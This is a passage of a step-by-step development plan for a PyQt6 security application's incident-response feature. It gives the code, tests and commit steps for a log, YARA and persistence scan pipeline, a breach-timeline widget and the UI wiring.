        event_type = _RULE_EVENT_TYPE.get(rule_name)
        if event_type is None:
            return
        source = finding.title.split(" — ")[1] if " — " in finding.title else ""
        self._db.insert_incident_event({
            "scan_id":    self._scan_id,
            "timestamp":  finding.created_at,
            "event_type": event_type,
            "source_host": source,
            "dest_host":  "",
            "description": finding.title,
            "evidence":   finding.description[:200],
        })

    # ── Stage 2: YARA Scan ───────────────────────────────────────────────────

    def _stage2_yara_scan(self) -> int:
        self.log_line.emit("[incident] Stage 2 — YARA scan")
        try:
            from workers.tools import yara_scanner
            matches = yara_scanner.run(extra_path=self._yara_extra_path)
        except Exception as exc:
            self.log_line.emit(f"[incident] YARA stage skipped: {exc}")
            return 0

        count = 0
        for m in matches:
            finding = Finding(
                id=None, scan_id=self._scan_id, host_id=None,
                tool="yara", severity=m.get("severity", "high"),
                title=f"YARA: {m['rule']}",
                description=m.get("description", ""),
                raw_json="",
                created_at=datetime.now(timezone.utc).isoformat(),
            )
            finding.id = self._db.insert_finding(finding)
            self._db.insert_incident_event({
                "scan_id":    self._scan_id,
                "timestamp":  finding.created_at,
                "event_type": "entry",
                "source_host": m.get("file", ""),
                "dest_host":  "",
                "description": finding.title,
                "evidence":   finding.description[:200],
            })
            self.finding_found.emit(finding)
            self.log_line.emit(f"[incident] YARA match: {m['rule']} in {m.get('file', '')}")
            count += 1

        self.log_line.emit(f"[incident] Stage 2 complete — {count} matches")
        return count

    # ── Stage 3: Persistence Check ───────────────────────────────────────────

    def _stage3_persistence(self) -> int:
        self.log_line.emit("[incident] Stage 3 — persistence check")
        try:
            from workers.tools import persistence_checker
            results = persistence_checker.run()
        except Exception as exc:
            self.log_line.emit(f"[incident] persistence check skipped: {exc}")
            return 0

        count = 0
        for r in results:
            finding = Finding(
                id=None, scan_id=self._scan_id, host_id=None,
                tool="persistence", severity=r.get("severity", "medium"),
                title=f"Persistence: {r['check'].replace('_', ' ').title()} — {r['path']}",
                description=r.get("detail", ""),
                raw_json="",
                created_at=datetime.now(timezone.utc).isoformat(),
            )
            finding.id = self._db.insert_finding(finding)
            self._db.insert_incident_event({
                "scan_id":    self._scan_id,
                "timestamp":  finding.created_at,
                "event_type": "persistence",
                "source_host": r.get("path", ""),
                "dest_host":  "",
                "description": finding.title,
                "evidence":   r.get("detail", "")[:200],
            })
            self.finding_found.emit(finding)
            self.log_line.emit(f"[incident] persistence: {r['check']} — {r['path']}")
            count += 1

        self.log_line.emit(f"[incident] Stage 3 complete — {count} findings")
        return count
```

- [ ] **Step 4.4: Run tests — verify they pass**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_incident_worker.py -v
```

Expected: all 12 tests PASS.

- [ ] **Step 4.5: Commit**

```bash
git add workers/incident_worker.py tests/test_incident_worker.py
git commit -m "feat: add IncidentWorker with 3-stage log/YARA/persistence pipeline"
```

---

### Task 5: BreachTimeline widget (TDD)

**Files:**
- Create: `screens/widgets/breach_timeline.py`
- Create: `tests/test_breach_timeline.py`

- [ ] **Step 5.1: Write failing tests**

Create `tests/test_breach_timeline.py`:

```python
import os
import pytest
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from PyQt6.QtWidgets import QApplication
app = QApplication.instance() or QApplication([])


def _make_timeline():
    from screens.widgets.breach_timeline import BreachTimeline
    t = BreachTimeline.__new__(BreachTimeline)
    t._rows = []
    return t


def test_add_event_increments_row_count():
    t = _make_timeline()
    t.add_event({"timestamp": "2026-06-11T00:00:00Z", "event_type": "entry",
                  "source_host": "1.2.3.4", "dest_host": "server", "description": "SSH brute force"})
    assert len(t._rows) == 1


def test_add_three_events_in_order():
    t = _make_timeline()
    for et in ["entry", "lateral", "persistence"]:
        t.add_event({"timestamp": "2026-06-11T00:00:00Z", "event_type": et,
                      "source_host": "x", "dest_host": "y", "description": et})
    assert len(t._rows) == 3
    types = [r["event_type"] for r in t._rows]
    assert types == ["entry", "lateral", "persistence"]


def test_reset_clears_all_rows():
    t = _make_timeline()
    t.add_event({"timestamp": "2026-06-11T00:00:00Z", "event_type": "entry",
                  "source_host": "x", "dest_host": "y", "description": "test"})
    t._rows.clear()
    assert len(t._rows) == 0


def test_add_event_stores_event_type():
    t = _make_timeline()
    t.add_event({"timestamp": "T", "event_type": "persistence",
                  "source_host": "cron", "dest_host": "", "description": "evil cron"})
    assert t._rows[0]["event_type"] == "persistence"
```

- [ ] **Step 5.2: Run tests — verify they fail**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_breach_timeline.py -v 2>&1 | head -15
```

Expected: `ModuleNotFoundError` — file does not exist yet.

- [ ] **Step 5.3: Create `screens/widgets/breach_timeline.py`**

```python
from PyQt6.QtCore import Qt
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QFrame, QScrollArea,
)

_EVENT_COLORS = {
    "entry":       "#C94A62",
    "lateral":     "#B38B00",
    "persistence": "#5F4A8B",
    "exfil":       "#C94A62",
    "anomaly":     "#5A7A9B",
}


class BreachTimeline(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._rows: list[dict] = []
        self._setup_ui()

    def _setup_ui(self):
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)

        header = QLabel("BREACH TIMELINE")
        header.setStyleSheet(
            "color: #5F4A8B; font-size: 10px; letter-spacing: 1px; padding: 4px 8px;"
        )
        outer.addWidget(header)

        self._scroll = QScrollArea()
        self._scroll.setWidgetResizable(True)
        self._scroll.setStyleSheet("QScrollArea { border: none; background: #FEFACD; }")

        self._container = QWidget()
        self._container.setStyleSheet("background: #FEFACD;")
        self._layout = QVBoxLayout(self._container)
        self._layout.setContentsMargins(8, 4, 8, 4)
        self._layout.setSpacing(4)
        self._layout.addStretch()

        self._scroll.setWidget(self._container)
        outer.addWidget(self._scroll, stretch=1)

    def add_event(self, event: dict) -> None:
        self._rows.append(event)
        row = self._make_row(event)
        self._layout.insertWidget(self._layout.count() - 1, row)
        self._scroll.verticalScrollBar().setValue(
            self._scroll.verticalScrollBar().maximum()
        )

    def reset(self) -> None:
        self._rows.clear()
        while self._layout.count() > 1:
            item = self._layout.takeAt(0)
            if item and item.widget():
                item.widget().deleteLater()

    def _make_row(self, event: dict) -> QFrame:
        frame = QFrame()
        frame.setStyleSheet(
            "QFrame { background: #FFFEF2; border: 1px solid #8B75C2;"
            " border-radius: 4px; }"
        )
        row_layout = QHBoxLayout(frame)
        row_layout.setContentsMargins(6, 4, 6, 4)
        row_layout.setSpacing(8)

        ts = event.get("timestamp", "")[:19].replace("T", " ")
        ts_label = QLabel(ts)
        ts_label.setStyleSheet("color: #5A7A9B; font-family: monospace; font-size: 10px;")
        ts_label.setFixedWidth(130)
        row_layout.addWidget(ts_label)

        et = event.get("event_type", "anomaly")
        color = _EVENT_COLORS.get(et, "#5A7A9B")
        badge = QLabel(et.upper())
        badge.setStyleSheet(
            f"background: {color}; color: #FEFACD; border-radius: 3px;"
            " padding: 1px 6px; font-size: 9px; font-weight: bold;"
        )
        badge.setFixedWidth(80)
        row_layout.addWidget(badge)

        src = event.get("source_host", "")
        dst = event.get("dest_host", "")
        route = f"{src} → {dst}" if dst else src
        if route:
            route_label = QLabel(route)
            route_label.setStyleSheet("color: #2A1F45; font-size: 10px;")
            route_label.setFixedWidth(160)
            row_layout.addWidget(route_label)

        desc = event.get("description", "")
        desc_label = QLabel(desc)
        desc_label.setStyleSheet("color: #2A1F45; font-size: 10px;")
        desc_label.setWordWrap(True)
        row_layout.addWidget(desc_label, stretch=1)

        return frame
```

- [ ] **Step 5.4: Run tests — verify they pass**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/test_breach_timeline.py -v
```

Expected: all 4 tests PASS.

- [ ] **Step 5.5: Verify import is clean**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen python -c "from screens.widgets.breach_timeline import BreachTimeline; print('OK')"
```

Expected: `OK`

- [ ] **Step 5.6: Commit**

```bash
git add screens/widgets/breach_timeline.py tests/test_breach_timeline.py
git commit -m "feat: add BreachTimeline widget with chronological event rows"
```

---

### Task 6: IncidentPage UI

**Files:**
- Create: `screens/incident_page.py`

- [ ] **Step 6.1: Create `screens/incident_page.py`**

```python
from datetime import datetime, timezone

from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QPushButton, QSplitter, QPlainTextEdit, QFileDialog,
)

from db import DB
from models import Scan
from screens.widgets.breach_timeline import BreachTimeline
from screens.widgets.severity_rings import SeverityRings
from screens.widgets.finding_cards import FindingCards
from workers.incident_worker import IncidentWorker


class IncidentPage(QWidget):
    scan_ready = pyqtSignal(int)

    def __init__(self, db: DB | None = None, parent=None):
        super().__init__(parent)
        self._db = db
        self._worker: IncidentWorker | None = None
        self._scan_id: int | None = None

        self._log_input: QLineEdit | None = None
        self._yara_input: QLineEdit | None = None
        self._start_btn: QPushButton | None = None
        self._status_label: QLabel | None = None
        self._timeline: BreachTimeline | None = None
        self._severity_rings: SeverityRings | None = None
        self._finding_cards: FindingCards | None = None
        self._terminal: QPlainTextEdit | None = None

        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(12, 12, 12, 12)
        layout.setSpacing(8)

        # --- top bar ---
        top_bar = QHBoxLayout()

        self._log_input = QLineEdit()
        self._log_input.setPlaceholderText("Log file path (e.g. /var/log/auth.log)")
        browse_log_btn = QPushButton("Browse…")
        browse_log_btn.setFixedWidth(72)
        browse_log_btn.clicked.connect(self._on_browse_log)

        self._yara_input = QLineEdit()
        self._yara_input.setPlaceholderText("Extra YARA scan path (optional)")
        self._yara_input.setFixedWidth(240)
        browse_yara_btn = QPushButton("Browse…")
        browse_yara_btn.setFixedWidth(72)
        browse_yara_btn.clicked.connect(self._on_browse_yara)

        self._start_btn = QPushButton("▶  Start Scan")
        self._start_btn.setEnabled(self._db is not None)
        self._start_btn.clicked.connect(self._on_start_stop)
        self._start_btn.setStyleSheet(
            "QPushButton { background: #5F4A8B; color: #FEFACD; border-radius: 4px; padding: 4px 12px; }"
            "QPushButton:hover { background: #8B75C2; }"
            "QPushButton:disabled { background: #5A7A9B; color: #FFFEF2; }"
        )

        top_bar.addWidget(self._log_input, stretch=1)
        top_bar.addWidget(browse_log_btn)
        top_bar.addSpacing(12)
        top_bar.addWidget(self._yara_input)
        top_bar.addWidget(browse_yara_btn)
        top_bar.addSpacing(12)
        top_bar.addWidget(self._start_btn)
        layout.addLayout(top_bar)

        # --- status label ---
        self._status_label = QLabel("Idle — select a log file and click Start Scan")
        self._status_label.setStyleSheet("color: #2A1F45; font-size: 11px;")
        layout.addWidget(self._status_label)

        # --- body ---
        self._timeline = BreachTimeline()
        self._severity_rings = SeverityRings()
        self._finding_cards = FindingCards()
        self._terminal = QPlainTextEdit()
        self._terminal.setReadOnly(True)
        self._terminal.setStyleSheet(
            "font-family: monospace; font-size: 11px; color: #2A1F45; background: #FEFACD;"
        )

        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(8)
        right_layout.addWidget(self._severity_rings)
        right_layout.addWidget(self._finding_cards, stretch=1)

        body_splitter = QSplitter(Qt.Orientation.Horizontal)
        body_splitter.addWidget(self._timeline)
        body_splitter.addWidget(right_panel)
        body_splitter.setSizes([600, 400])

        main_splitter = QSplitter(Qt.Orientation.Vertical)
        main_splitter.addWidget(body_splitter)
        main_splitter.addWidget(self._terminal)
        main_splitter.setSizes([750, 150])

        layout.addWidget(main_splitter, stretch=1)

    def _on_browse_log(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Log File", "/var/log")
        if path:
            self._log_input.setText(path)

    def _on_browse_yara(self):
        path = QFileDialog.getExistingDirectory(self, "Select Extra YARA Scan Directory")
        if path:
            self._yara_input.setText(path)

    def _on_start_stop(self):
        if self._worker and self._worker.isRunning():
            self._worker.stop()
            self._start_btn.setText("Stopping…")
            self._start_btn.setEnabled(False)
            return

        log_path = self._log_input.text().strip()
        if not log_path:
            self._status_label.setText("Please select a log file first.")
            self._status_label.setStyleSheet("color: #C94A62; font-size: 11px;")
            return

        scan = Scan(
            id=None, client_id=None,
            target=log_path,
            status="running",
            started_at=datetime.now(timezone.utc).isoformat(),
            finished_at=None,
        )
        self._scan_id = self._db.insert_scan(scan)

        self._timeline.reset()
        self._severity_rings.reset()
        self._finding_cards.reset()
        self._terminal.clear()

        self._worker = IncidentWorker(
            log_path=log_path,
            scan_id=self._scan_id,
            db=self._db,
            yara_extra_path=self._yara_input.text().strip(),
        )
        self._worker.finding_found.connect(self._on_finding)
        self._worker.log_line.connect(self._terminal.appendPlainText)
        self._worker.scan_complete.connect(self._on_complete)
        self._worker.scan_failed.connect(self._on_failed)
        self._worker.finished.connect(self._on_worker_finished)
        self._worker.start()

        self._start_btn.setText("■  Stop Scan")
        self._status_label.setText("Scanning…")
        self._status_label.setStyleSheet("color: #5F4A8B; font-size: 11px;")

    def _on_finding(self, finding):
        self._severity_rings.add_finding(finding)
        self._finding_cards.add_finding(finding)

    def _on_complete(self, _hosts: int, findings: int):
        self._start_btn.setText("▶  Start Scan")
        self._start_btn.setEnabled(True)
        self._status_label.setText(f"Done — {findings} findings")
        self._status_label.setStyleSheet("color: #00A85A; font-size: 11px;")
        self._finding_cards.on_scan_complete(0, findings)
        if self._scan_id is not None:
            for event in self._db.get_incident_events(self._scan_id):
                self._timeline.add_event(event)
            self.scan_ready.emit(self._scan_id)

    def _on_failed(self, msg: str):
        self._start_btn.setText("▶  Start Scan")
        self._start_btn.setEnabled(True)
        self._status_label.setText(f"Error: {msg}")
        self._status_label.setStyleSheet("color: #C94A62; font-size: 11px;")

    def _on_worker_finished(self):
        if not self._start_btn.isEnabled():
            self._start_btn.setText("▶  Start Scan")
            self._start_btn.setEnabled(True)
```

- [ ] **Step 6.2: Verify import is clean**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen python -c "from screens.incident_page import IncidentPage; print('OK')"
```

Expected: `OK`

- [ ] **Step 6.3: Run full test suite for regressions**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/ -q 2>&1 | tail -5
```

Expected: all tests pass.

- [ ] **Step 6.4: Commit**

```bash
git add screens/incident_page.py
git commit -m "feat: add IncidentPage UI with log picker, breach timeline, and worker wiring"
```

---

### Task 7: Sidebar + MainWindow wiring

**Files:**
- Modify: `sidebar.py`
- Modify: `main_window.py`

- [ ] **Step 7.1: Add Incident nav item to sidebar**

In `sidebar.py`, find `_NAV_ITEMS` and append:

```python
_NAV_ITEMS = [
    ("⊞", "Dashboard", 0),
    ("+", "New Client", 1),
    ("⚡", "Scan", 2),
    ("📄", "Report", 3),
    ("⚙", "Settings", 4),
    ("⬡", "Internal", 5),
    ("🔥", "Incident", 6),
]
```

- [ ] **Step 7.2: Add IncidentPage to MainWindow**

In `main_window.py`, add the import after the existing screen imports:

```python
from screens.incident_page import IncidentPage
```

In `_setup_ui`, after the `self._internal` block (index 5), add:

```python
        self._incident = IncidentPage(db=self._db)
        self._stack.addWidget(self._incident)                                   # 6
        self._incident.scan_ready.connect(self._on_scan_ready)
```

- [ ] **Step 7.3: Verify import and stack**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen python -c "
from PyQt6.QtWidgets import QApplication; app = QApplication([])
from main_window import MainWindow
w = MainWindow(tool_results={}, db=None)
print('Stack size:', w._stack.count())
print('Index 6:', type(w._stack.widget(6)).__name__)
from sidebar import _NAV_ITEMS
print('Nav items:', [label for _, label, _ in _NAV_ITEMS])
print('OK')
"
```

Expected:
```
Stack size: 7
Index 6: IncidentPage
Nav items: ['Dashboard', 'New Client', 'Scan', 'Report', 'Settings', 'Internal', 'Incident']
OK
```

- [ ] **Step 7.4: Run full test suite**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest tests/ -q 2>&1 | tail -5
```

If any test asserts an exact count of sidebar buttons or stack widgets, update it to the new count (7 stack pages, 7 nav items).

- [ ] **Step 7.5: Commit**

```bash
git add sidebar.py main_window.py
git commit -m "feat: wire IncidentPage into sidebar and MainWindow stack at index 6"
```

---

### Task 8: Full test suite + smoke test

**Files:** none new

- [ ] **Step 8.1: Run the complete test suite**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen pytest --tb=short -q
```

Expected: zero failures. If any test fails, fix before continuing.

- [ ] **Step 8.2: Smoke test — import check for every new module**

```bash
cd /home/kaelix/Desktop/secureops && source venv/bin/activate && QT_QPA_PLATFORM=offscreen python -c "
from workers.incident_worker import IncidentWorker
from workers.tools.yara_scanner import run as yara_run
from workers.tools.persistence_checker import run as persist_run
from screens.incident_page import IncidentPage
from screens.widgets.breach_timeline import BreachTimeline
from db import DB
db = DB(':memory:')
print('incident_events table:', db._conn.execute(\"SELECT name FROM sqlite_master WHERE name='incident_events'\").fetchone())
print('get_incident_events:', db.get_incident_events(1))
print('All imports OK')
"
```

Expected: `All imports OK`

- [ ] **Step 8.3: Final commit**

```bash
git add -A
git commit -m "feat: Phase 5 complete — incident response with YARA, persistence check, and breach timeline"
```
